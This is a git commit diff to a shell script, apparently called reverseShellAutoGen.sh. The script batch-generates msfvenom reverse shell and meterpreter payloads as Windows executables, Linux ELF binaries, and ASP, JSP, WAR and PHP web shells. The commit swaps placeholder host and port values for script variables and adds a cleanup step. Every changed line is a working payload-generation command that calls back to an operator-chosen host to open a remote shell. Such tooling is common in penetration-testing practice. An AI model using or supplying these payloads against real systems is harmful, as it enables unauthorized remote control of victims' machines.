42cec7843dc87681368c2ece2e0985301566c7b0
Mevensen <mats.f.evensen@gmail.com>
2021-06-11 11:28:36 +0200

    changes script

--- reverseShellAutoGen.sh
+++ reverseShellAutoGen.sh
@@ -19,24 +19,26 @@ tempd='/tmp/'
 msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x86.exe"
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x64.exe"
 
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > $tempd"rshell"$port"-x86.elf"
-msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > $tempd"rshell"$port"-x64.elf"
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port -f elf > $tempd"rshell"$port"-x86.elf"
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=$ip LPORT=$port -f elf > $tempd"rshell"$port"-x64.elf"
 
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > $tempd"rshell"$port".asp"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"rshell"$port".jsp"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > $tempd"rshell"$port".war"
-msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > $tempd"rshell"$port".php"
+msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f asp > $tempd"rshell"$port".asp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"rshell"$port".jsp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $tempd"rshell"$port".war"
+msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -f raw > $tempd"rshell"$port".php"
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > $tempd"mrshell"$port"-x86.exe"
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > $tempd"mrshell"$port"-x64.exe"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"mrshell"$port"-x86.exe"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"mrshell"$port"-x64.exe"
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > $tempd"mrshell"$port".asp"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"mrshell"$port".jsp"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > $tempd"mrshell"$port".war"
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > $tempd"mrshell"$port".php"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $tempd"mrshell"$port".asp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"mrshell"$port".jsp"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $tempd"mrshell"$port".war"
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"mrshell"$port".php"
 
 #Copy revereseshells
 sudo cp $tempd/*rshell* $directory
-#Clean
+
+#Clean up tmp
+sudo rm $tempd/*rshell*
 
 exit 0
